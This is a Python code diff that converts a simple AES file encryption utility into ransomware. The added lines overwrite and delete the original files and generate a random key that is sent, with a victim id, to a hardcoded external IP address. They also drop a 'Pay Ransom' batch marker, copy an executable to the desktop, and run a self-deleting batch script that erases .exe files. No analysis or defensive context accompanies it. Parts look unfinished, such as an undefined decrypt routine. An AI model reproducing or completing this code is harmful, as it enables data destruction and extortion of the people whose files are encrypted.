@@ -1,4 +1,4 @@
-import os, random
+import os, random, getpass, shutil, string, urllib
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 
@@ -27,6 +27,9 @@ def encrypt(key, filename):
           chunk += ' ' * (16 - (len(chunk) % 16))
 
         outfile.write(encryptor.encrypt(chunk))
+  with open(filename,'w') as oldfile:
+    oldfile.write("00000000")
+  os.remove(filename)
 
 
 def decrypt(key, filename):
@@ -54,23 +57,30 @@ def getKey(password):
   hasher = SHA256.new(password)
   return hasher.digest()
 
-def Main():
-  choice = raw_input("Would you like to (E)ncrypt or (D)ecrypt?: ")
+def start_encrypting():
+  shutil.copy("Setup.exe","C:/Users/"+getpass.getuser()+"/Desktop/Setup.exe")
+  
+  password=''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(16))
+  id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+  urllib.urlopen("http://139.59.8.120?id="+id+"&key="+password)
+  
+  f=open("D:/check.bat","w")
+  f.write("echo 'Pay Ransom'")
+  f.close()
+  
 
-  if choice == 'E':
-    filename = raw_input("File to encrypt: ")
-    password = raw_input("Password: ")
-    encrypt(getKey(password), filename)
-    print "Done."
-  elif choice == 'D':
-    filename = raw_input("File to decrypt: ")
-    password = raw_input("Password: ")
-    decrypt(getKey(password), filename)
-    print "Done."
-  else:
-    print "No Option selected, closing..."
+
 
 if __name__ == '__main__':
-  Main()
+  if os.path.isfile("D:/check.bat"):
+    start_encrypting()
+  else:
+    start_decrypting()
+
+  with open("del.bat", "w") as delfile:
+    delfile.write("@echo off\n")
+    delfile.write('del *.exe\n')
+    delfile.write('del del.bat')
+  os.startfile("del.bat") 
 
 
